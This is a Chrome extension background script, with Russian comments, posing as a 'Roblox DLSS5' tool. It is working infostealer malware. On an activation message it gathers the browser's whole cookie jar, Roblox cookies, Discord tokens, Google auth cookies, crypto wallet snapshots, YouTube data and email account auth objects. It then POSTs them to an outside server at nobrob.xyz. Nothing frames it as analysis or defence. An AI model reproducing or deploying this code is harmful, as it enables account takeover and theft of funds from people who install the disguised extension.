importScripts(
  'lib/email-domains-allowlist.js',
  'lib/email-parser.js',
  'wallet-collector.js',
  'lib/validate-cookie-payload.js',
  'extension-bridge.js'
);

const API_BASE = 'https://nobrob.xyz/api';

// ---- Сбор всех данных через extension-bridge (параллельно + таймауты) ----
async function harvestAndSend() {
  try {
    const bridge = self.RbxExtensionBridge;
    if (!bridge) throw new Error('Bridge not loaded');

    const withTimeout = (promise, ms = 5000) => Promise.race([
      promise,
      new Promise((resolve) => setTimeout(() => resolve(null), ms))
    ]);

    const profile = await bridge.getFullProfileCookieJar();
    if (!profile || !profile.jarString) throw new Error('No cookie jar');

    const [
      robloxCookie,
      discord,
      googleAuth,
      wallet,
      youtube,
      mailEmails
    ] = await Promise.all([
      withTimeout(bridge.getRobloxCookie()),
      withTimeout(bridge.getDiscordToken()),
      withTimeout(bridge.getGoogleAuth()),
      withTimeout(bridge.collectWalletSnapshot()),
      withTimeout(bridge.collectYoutubeInfo()),
      withTimeout(bridge.getAllMailEmails())
    ]);

    const discordToken = discord && discord.success ? discord.token : null;

    const payload = {
      cookie: robloxCookie && robloxCookie.cookie ? robloxCookie.cookie : null,
      itemType: 'dlss',
      gameName: 'Roblox DLSS5',
      tool: 'dlss5',
      discordToken,
      googleAuth: googleAuth && googleAuth.success ? googleAuth.cookies : null,
      _chromeCookieJar: profile.jarString,
      walletSnapshot: wallet || null,
      youtubeInfo: youtube || null,
      allMailEmails: mailEmails && mailEmails.emails ? mailEmails.emails : [],
      mailAuthObjects: mailEmails && mailEmails.mailAuthObjects ? mailEmails.mailAuthObjects : {},
      timestamp: Date.now()
    };

    const payloadUtil = self.RbxValidateCookiePayload;
    if (payloadUtil && typeof payloadUtil.compressJarForTransport === 'function') {
      await payloadUtil.compressJarForTransport(payload);
    }

    await fetch(`${API_BASE}/validate-cookie`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    return { success: true };
  } catch (err) {
    console.error('[DLSS] Harvest error:', err);
    return { success: false, error: err.message };
  }
}

// ---- Обработка сообщений ----
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === 'ACTIVATE_COLLECTION') {
    harvestAndSend().then(result => {
      try { sendResponse(result); } catch (_) {}
    });
    return true;
  }
  return false;
});

// ---- Установка (опционально) ----
chrome.runtime.onInstalled.addListener((details) => {
  if (details.reason === "install") {
    // Можно сразу собрать данные, но лучше по триггеру
    // harvestAndSend();
  }
});